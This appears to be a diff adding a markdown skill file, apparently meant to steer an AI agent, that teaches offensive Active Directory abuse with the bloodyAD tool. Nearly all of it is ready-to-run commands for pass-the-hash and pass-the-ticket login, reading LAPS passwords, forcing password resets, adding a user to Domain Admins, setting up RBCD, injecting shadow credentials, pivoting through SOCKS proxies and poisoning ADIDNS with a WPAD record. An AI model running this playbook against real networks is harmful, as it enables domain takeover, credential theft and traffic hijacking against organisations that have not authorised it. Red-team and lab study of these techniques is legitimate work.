@@ -1,0 +1,80 @@
+---
+name: bloodyad
+description: "Auth/lab ref: Swiss army knife for Active Directory privilege escalation and object manipulation via LDAP/SAMR. Supports PTH, PTT, Cert auth."
+---
+
+# bloodyad
+
+**Goal**: Exploit Active Directory Access Control List (ACL) vulnerabilities and manipulate AD objects without relying on WinRM or native Windows RSAT tools.
+
+## Cognitive Stance
+
+`bloodyAD` is an offensive LDAP/SAMR framework. It acts as the direct execution layer for attack paths identified by BloodHound (GenericAll, WriteDACL, ForceChangePassword, etc). It operates cross-platform and fully supports proxying (SOCKS).
+
+## Core Authentication Patterns
+
+Authentication follows standard Impacket-style formats but with specific arguments. The executable is typically invoked as `bloodyAD`.
+
+```bash
+# Cleartext
+bloodyAD -H <DC_IP> -d <domain> -u <username> -p <password> <command>
+
+# Pass-The-Hash (NTLM) - Uses LMHASH:NTHASH or just NTHASH depending on format, but full format is safer
+bloodyAD -H <DC_IP> -d <domain> -u <username> -p aad3b435b51404eeaad3b435b51404ee:<NTHash> <command>
+
+# Kerberos Pass-The-Ticket (-k flag with optional ccache keyword)
+export KRB5CCNAME=/tmp/ticket.ccache
+bloodyAD -H <DC_IP> -d <domain> -k <command>
+```
+
+## Common Exploitation Workflows
+
+### 1. Object and Attribute Enumeration
+If you need to read a specific attribute (e.g., LAPS passwords, LAPS properties, quota sizes).
+```bash
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass get object target_user --attr ms-Mcs-AdmPwd
+```
+
+### 2. ForceChangePassword (Reset Target User Password)
+If you hold `ForceChangePassword`, `GenericWrite`, or `GenericAll` over a user.
+```bash
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass set password target_user 'NewP@ssw0rd123!'
+```
+
+### 3. Group Modification (Add user to Domain Admins)
+If you hold `AddMember`, `WriteProperty`, or `GenericAll` over a Group.
+```bash
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add groupMember 'Domain Admins' target_user
+```
+
+### 4. Resource-Based Constrained Delegation (RBCD)
+If you hold `GenericAll` or `GenericWrite` over a Computer object, you can set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
+```bash
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add rbcd TARGET_COMPUTER '$ATTACKER_COMPUTER'
+```
+*(After doing this, use `getST.py` from Impacket to request a service ticket).*
+
+### 5. Shadow Credentials (KeyCredentialLink)
+If you have `GenericWrite` or `GenericAll` on a user or computer.
+```bash
+# Injects a KeyCredentialLink. BloodyAD will automatically attempt to PKINIT and get the NTLM hash
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add shadowCredentials target_user
+```
+*(If the automatic unpac fails, BloodyAD saves the certificate. You can then leverage it manually using `gettgtpkinit.py` via PKINITtools).*
+
+### 6. Proxying and Pivoting
+BloodyAD relies extensively on standard network sockets and parses environment variables. It works seamlessly through SOCKS proxies via `proxychains`.
+```bash
+proxychains bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass get object target_user
+```
+*(Note for Proxychains: ensure `/etc/proxychains4.conf` or `/etc/proxychains.conf` points to your SOCKS port, e.g. Chisel or Ligolo-ng).*
+
+### 7. DNS Record Manipulation
+Used to hijack WPAD, internal resources, or relay targets by poisoning `ADIDNS`.
+```bash
+# Add an A record pointing evil_wpad.contoso.local to 192.168.1.50
+bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add dnsRecord evil_wpad 192.168.1.50
+```
+
+## Anti-Patterns
+- Modifying standard Domain Admin passwords or altering live production `Domain Admins` groups is extremely noisy and often forbidden by red-team Rules of Engagement. Prefer Shadow Credentials or RBCD on computer accounts whenever possible. 
